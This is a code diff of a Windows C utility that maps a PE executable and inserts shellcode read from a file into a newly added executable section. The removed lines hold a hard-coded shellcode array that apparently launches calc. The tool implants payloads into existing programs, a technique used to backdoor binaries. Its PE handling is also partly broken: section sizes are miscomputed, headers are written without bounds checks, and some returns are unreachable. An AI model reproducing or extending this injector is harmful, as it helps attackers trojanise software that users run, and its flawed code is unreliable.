@@ -1,48 +1,125 @@
 #include <Windows.h>
 #include <stdio.h>
 
-const unsigned char Shellcode[] = {
-	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
-	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
-	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
-	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
-	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
-	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
-	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
-	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
-	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
-};
-
 int main(int argc, char* argv[]) {
-	if (argc < 2) {
-		printf("[!] Usage \"%s\" <.bin> <PE> <New Section name>", argv[0]);
+    if (argc < 2) {
+        printf("[!] Usage \"%s\" <PE> <New Section name> <.bin>\n", argv[0]);
+        return -1;
+    }
+
+	PBYTE pShellcode;
+	SIZE_T stShellcode;
+	if(!ReadFileFromDisk(argv[3], &pShellcode, &stShellcode)){
 		return -1;
 	}
 
-	LPCSTR scName = argv[1];
-	PBYTE pSc = (PBYTE)Shellcode;
-	SIZE_T sSc = sizeof(pSc);
+    LPCSTR PeName = argv[1];
+    HANDLE hPE = CreateFileA(PeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hPE == INVALID_HANDLE_VALUE) {
+        printf("[!] CreateFileA for PE file failed with error: %lu\n", GetLastError());
+        return -1;
+    }
 
-	LPCSTR PeName = argv[2];
-	HANDLE hPE;
-	SIZE_T sPE;
-	PBYTE pPE;
+    HANDLE hMapFile;
+    LPVOID pPE;
+    if (!MapView(hPE, PeName,&hMapFile, &pPE, stShellcode)) {
+		goto _CLEANUP;
+        return -1;
+    }
 
-	LPCSTR SectionName = argv[3];
+    if (!InsertCustomSection(pPE, argv[2], (PVOID)pShellcode, stShellcode)) {
+		goto _CLEANUP;
+        return -1;
+    }
+_CLEANUP:
 
-	/*if (!ReadPEFromDisk(fileName, &pFile, &sFile)) {
-		return -1;
-	}*/
+    UnMapView(hMapFile, pPE);
+    CloseHandle(hPE);
+    return 0;
+}
 
-	HANDLE hPE = CreateFileA(PeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	MapView(hPE, );
+BOOL MapView(HANDLE hPE, LPCSTR PeName,PHANDLE hMapFile, LPVOID* pImage, SIZE_T SctSize) {
+    DWORD PreSize = GetFileSize(hPE, NULL);
+	
+	printf("[*] Reading, Mapping and change size at \"%s\"...\n", PeName);
 
-	if (!InsertCustomSection(pPE, sPE)) {
-		return -1;
-	}
+	printf("\t[i] Original file sizeof(%s)\n", PeName);
+	printf("\t[i] Shellcode sizeof(%d)\n", SctSize);
 
-	return 0;
+	DWORD NewSize = PreSize + SctSize;
+	printf("\t[*] File sizeof(%s) after increased with shellcode size: %d\n", PeName, NewSize);
+
+    *hMapFile = CreateFileMappingA(hPE, NULL, PAGE_READWRITE, 0, NewSize, NULL);
+    if (*hMapFile == NULL) {
+        printf("\t[!] CreateFileMapping failed with error: %lu\n", GetLastError());
+        return FALSE;
+    }
+    *pImage = MapViewOfFile(*hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
+    if (*pImage == NULL) {
+        printf("\t[!] MapViewOfFile failed with error: %lu\n", GetLastError());
+        CloseHandle(*hMapFile);
+        return FALSE;
+    }
+	printf("\t[*] Mapped memory for PE at 0x%p\n\n", pImage);
+
+    return TRUE;
+}
+
+BOOL UnMapView(HANDLE hMapFile, LPVOID pImage) {
+    if (!UnmapViewOfFile(pImage)) {
+        printf("[!] Error UnMapView: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    if (!CloseHandle(hMapFile)) {
+        printf("[!] Error CloseHandle: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL InsertCustomSection(LPVOID pPE, LPCSTR SctName, PVOID SctData, ULONG SctSize) {
+    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;
+    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)pPE + pImgDosHdr->e_lfanew);
+    PIMAGE_SECTION_HEADER pImgSctHdr = IMAGE_FIRST_SECTION(pImgNtHdr);
+
+	printf("[*] Starting insert new section in PE file...\n");
+
+    printf("\t[i] Number of Sections pre-change: %d\n", pImgNtHdr->FileHeader.NumberOfSections);
+
+    PIMAGE_SECTION_HEADER pTextSection = NULL;
+    for (DWORD i = 0; i < pImgNtHdr->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)pImgSctHdr[i].Name, ".text") == 0) {
+            pTextSection = &pImgSctHdr[i];
+            break;
+        }
+    }
+    if (pTextSection == NULL) {
+        printf("\t[!] .text section not found\n");
+        return FALSE;
+    }
+    DWORD NewSectionRVA = pTextSection->VirtualAddress + pTextSection->Misc.VirtualSize;
+    DWORD NewSectionRawSize = SctSize;
+    DWORD NewSectionRawOffset = pTextSection->PointerToRawData + pTextSection->SizeOfRawData;
+
+    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].VirtualAddress = NewSectionRVA;
+    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].SizeOfRawData = NewSectionRawSize;
+    memcpy(pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].Name, SctName, strlen(SctName));
+    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].PointerToRawData = NewSectionRawOffset;
+    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].Misc.VirtualSize = NewSectionRVA;
+    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
+
+    pImgNtHdr->FileHeader.NumberOfSections++;
+
+	printf("\t[*] Number Of Section pos-change: %d\n", pImgNtHdr->FileHeader.NumberOfSections);
+
+    memcpy((BYTE*)pPE + NewSectionRawOffset, SctData, SctSize);
+
+    printf("\t[*] New section '%s' inserted at RVA: 0x%x, Raw Offset: 0x%x\n\n", SctName, NewSectionRVA, NewSectionRawOffset);
+
+    return TRUE;
 }
 
 BOOL ReadFileFromDisk(LPCSTR lpFileName, PBYTE* pFile, SIZE_T* sFile) {
@@ -56,72 +133,40 @@ BOOL ReadFileFromDisk(LPCSTR lpFileName, PBYTE* pFile, SIZE_T* sFile) {
 
 	hFile = CreateFileA(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
-		goto _EndOfFunction;
+		printf("\t[!] CreateFileA for binary file Failed With Error : %d \n", GetLastError());
+		goto _CLEANUP;
 	}
 
-	printf("[*] CreateFile Successfully\n");
+	printf("\t[*] CreateFile for binary file Successfully\n");
 
 	dwFileSize = GetFileSize(hFile, NULL);
 	if (dwFileSize == NULL) {
-		printf("[!] GetFileSize Failed With Error : %d \n", GetLastError());
-		goto _EndOfFunction;
+		printf("\t[!] GetFileSize for binary file Failed With Error : %d \n", GetLastError());
+		goto _CLEANUP;
 	}
 
 	pBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
 	if (pBuff == NULL) {
-		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
-		goto _EndOfFunction;
+		printf("\t[!] HeapAlloc for binary file Failed With Error : %d \n", GetLastError());
+		goto _CLEANUP;
 	}
 
-	printf("[*] Allocated buffer of File at: 0x%p\n", pBuff);
-
-	printf("[i] File size of %s is %d\n", lpFileName, dwFileSize);
+	printf("\t[*] Allocated buffer of binary file at: 0x%p\n\n", pBuff);
 
 	if (!ReadFile(hFile, pBuff, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
-		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
-		printf("[!] Bytes Read : %d of : %d \n", dwNumberOfBytesRead, dwFileSize);
-		goto _EndOfFunction;
+		printf("\t[!] ReadFile for binary file Failed With Error : %d \n", GetLastError());
+		printf("\t[!] Bytes Read for binary file: %d of : %d \n\n", dwNumberOfBytesRead, dwFileSize);
+		goto _CLEANUP;
 	}
 
 
-_EndOfFunction:
+_CLEANUP:
 	*pFile = (PBYTE)pBuff;
 	*sFile = (SIZE_T)dwFileSize;
 	if (hFile)
 		CloseHandle(hFile);
 	if (*pFile == NULL || *sFile == NULL)
 		return FALSE;
-	return TRUE;
-}
-
-BOOL MapView(IN HANDLE hPE, OUT HANDLE* hMapFile, OUT LPVOID* pMapFile) {
-	
-	HANDLE hMapFile;
-	LPVOID pMapFile;
-
-	DWORD SizeMap = GetFileSize(hPE, NULL);
-
-	*hMapFile = CreateFileMappingA(hPE, NULL, PAGE_EXECUTE_READWRITE, 0,SizeMap, NULL);
-	if (hMapFile == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateFileMapping failed with error: %d", GetLastError());
-	}
-	*pMapFile = MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
-
-}
-
-BOOL InsertCustomSection(PBYTE pPE, SIZE_T sPE) {
-
-	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;
-	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pPE + pImgDosHdr->e_lfanew);
-	IMAGE_FILE_HEADER ImgFileHdr = pImgNtHdr->FileHeader;
-
-	printf("[i] Number of Section pre change: %d\n", ImgFileHdr.NumberOfSections);
-
-	ImgFileHdr.NumberOfSections = ImgFileHdr.NumberOfSections + 1;
-
-	printf("[i] Number of Section pos change: %d\n", ImgFileHdr.NumberOfSections);
-
 	return TRUE;
 }
 
